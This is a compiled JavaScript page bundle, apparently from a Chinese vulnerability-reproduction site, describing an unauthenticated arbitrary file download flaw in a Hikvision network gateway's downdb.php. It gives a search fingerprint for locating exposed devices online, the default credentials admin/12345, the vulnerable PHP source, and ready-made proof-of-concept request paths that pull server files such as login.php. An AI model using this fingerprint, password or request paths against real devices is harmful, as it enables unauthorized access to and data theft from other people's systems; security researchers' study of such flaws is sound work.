import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as a,e as n}from"./app-58e4a7d6.js";const d={},t=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>海康威视 联网网关 在页面 downdb.php 的参数fileName存在任意文件下载漏洞</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Hikvision 联网网关，流媒体管理服务器
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;杭州海康威视系统技术有限公司 版权所有&quot; &amp;&amp; title==&quot;联网网关&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>默认密码：<code>admin/12345</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191740359.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>出现漏洞的代码文件为downdb.php，可以未授权下载任意文件：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;?php
$file_name=$_GET[&#39;fileName&#39;];
$file_dir = &quot;../../../&quot;;
if   (!file_exists($file_dir.$file_name))   {   //检查文件是否存在  
  echo&#39;&lt;script&gt; alert(&quot;文件不存在!&quot;);window.history.back(-1);&lt;/script&gt;&#39;; 
  exit();

}else{	
	$file = fopen($file_dir . $file_name,&quot;r&quot;); // 打开文件
	// 输入文件标签
	Header(&quot;Content-type: application/octet-stream&quot;);
	Header(&quot;Accept-Ranges: bytes&quot;);
	Header(&quot;Accept-Length: &quot;.filesize($file_dir . $file_name));
	Header(&quot;Content-Disposition: attachment; filename=&quot; . $file_name);
	// 输出文件内容
	echo fread($file,filesize($file_dir.$file_name));
	fclose($file);
	exit();
}
?&gt; 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>POC：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/localDomain/downdb.php?fileName=web/html/data/login.php
/localDomain/downdb.php?fileName=web/html/localDomain/downdb.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205191740299.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14),l=[t];function s(r,c){return i(),a("div",null,l)}const m=e(d,[["render",s],["__file","HIKVISION 联网网关 downdb.php 任意文件读取漏洞.html.vue"]]);export{m as default};
